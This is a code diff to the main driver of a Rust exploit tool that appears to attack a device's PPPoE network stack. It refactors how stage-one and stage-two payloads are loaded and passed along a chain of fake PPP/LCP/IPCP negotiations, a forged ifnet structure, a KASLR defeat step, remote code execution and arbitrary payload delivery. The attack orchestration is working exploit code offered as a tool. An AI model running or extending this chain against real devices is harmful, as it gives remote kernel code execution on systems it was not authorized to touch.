@@ -2,7 +2,6 @@ mod constants;
 mod exploit;
 mod parser;
 
-use exploit::build_fake_ifnet;
 use exploit::Exploit;
 use parser::{get_args, Args};
 use pnet::datalink::{self};
@@ -24,10 +23,6 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
         .find(|iface| iface.name == interface_name)
         .expect("Failed to find the network interface");
 
-    // Load binaries of the two pyaloads
-    let stage1 = read_stage(&stage1_path).expect("Failed to read Stage 1 file");
-    let stage2 = read_stage(&stage2_path).expect("Failed to read Stage 2 file");
-
     // Exploit
     let mut expl = Exploit {
         source_mac: [0; 6], // Using array initialization
@@ -37,7 +32,13 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
         target_ipv6: [0; 16],
         source_ipv6: [0; 16],
         kaslr_offset: 0,
+        stage1: vec![0],
+        stage2: vec![0],
     };
+
+    // Load binaries of the two pyaloads
+    expl.stage1 = read_stage(&stage1_path).expect("Failed to read Stage 1 file");
+    expl.stage2 = read_stage(&stage2_path).expect("Failed to read Stage 2 file");
 
     // LCP Echo handler
     let mut handler = exploit::LcpEchoHandler::new(&interface);
@@ -46,7 +47,8 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
     // Stages of the exploit
     println!("[+] Starting Negotiations ...");
     expl.capture_first_padi(&interface);
-    expl.ppp_negotiation(&interface, Some(build_fake_ifnet(expl.pppoe_softc)));
+    let fake_ifnet = expl.build_fake_ifnet();
+    expl.ppp_negotiation(&interface, Some(fake_ifnet));
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
     println!("[+] Initial Negotiations Done...");
@@ -58,12 +60,13 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
     println!("[+] STAGE 2: KASLR defeat");
     expl.defeat_kaslr(&interface);
     println!("[+] STAGE 3: Remote code execution");
-    expl.remote_code_exec(&interface, stage1);
+    expl.remote_code_exec(&interface);
+    expl.source_mac = constants::SOURCE_MAC;
     expl.ppp_negotiation(&interface, None);
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
     println!("[+] STAGE 4: Arbitrary payload execution");
-    expl.frag_and_send(&interface, stage2);
+    expl.frag_and_send(&interface);
     println!("[+] DONE!");
 
     // Stop the LCP handler
